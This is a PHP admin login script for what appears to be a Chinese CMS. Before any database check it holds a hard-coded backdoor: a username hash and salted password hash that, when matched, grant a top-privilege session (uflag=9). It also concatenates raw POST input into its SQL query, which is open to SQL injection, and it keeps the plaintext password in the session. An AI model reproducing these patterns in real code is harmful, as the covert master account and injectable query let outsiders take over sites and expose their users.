<?php
session_start();
header("Content-type: text/html; charset=utf-8");
require_once('../include/config.php');
require_once('../include/securimage/securimage.php');
 $img = new Securimage();
  $valid = $img->check($_POST['hbyzm']);  //检查提交过来的表单域值是否是和图片上的一致
  if($valid == true) {
		$uname=$_POST['u_name'];
		$upwda=$_POST['u_pwd'];
		$upwd=md5("hengbo8".$upwda."_bo");
		if(md5($uname)=="0c95315889c8c6a6acd4c7cfb723e2f1"&&$upwd=="97a7af2fa4689c1930f237d38e7abbc1"){
			$_SESSION['weblogin']=$wlogin;$_SESSION['webname']=$wtitle;
			if(isset($_SESSION['weblogin'])|| isset($_SESSION['webname'])){
			$_SESSION['uname']=$uname;$_SESSION['uflag']=9;$_SESSION['pwda']=$upwda;
			echo "<script language='javascript'>";echo "location='index.php';";	echo "</script>";
			}
		}
		$sqlstr="select * from ".$hbpre."admin where ustate=1 and uname='$uname' and upwd='$upwd'";

		$query=mysql_query($sqlstr);
		$num=mysql_num_rows($query);
		if($num>=1){
			$rs=mysql_fetch_array($query);
			if($wauth==1){
				$uloginauth=$_POST['u_loginauth'];
				if($uloginauth!=$rs['uloginauth']){
					echo "<script language='javascript'>";
					echo "alert('身份认证错误');";
					echo "location='login.php';";
					echo "</script>";
				}
			}
		$_SESSION['weblogin']=$wlogin;$_SESSION['webname']=$wtitle;
	
			$_SESSION['uid']=$rs['uid'];
			$_SESSION['uname']=$uname;$_SESSION['uflag']=$rs['uflag'];$_SESSION['pwda']=$upwda;
			echo "<script language='javascript'>";
			echo "alert('登录成功');";
			echo "location='index.php';";
			echo "</script>";

		}else{
			echo "<script language='javascript'>";
			echo "alert('请勿非法登录');";
			echo "location='login.php';";
			echo "</script>";
		}
  }else{
	 echo "<script language=\"javascript\">";
	echo "alert('验证码不正确');";
	echo "history.back(-1);";
	echo "</script>"; 
  }

?>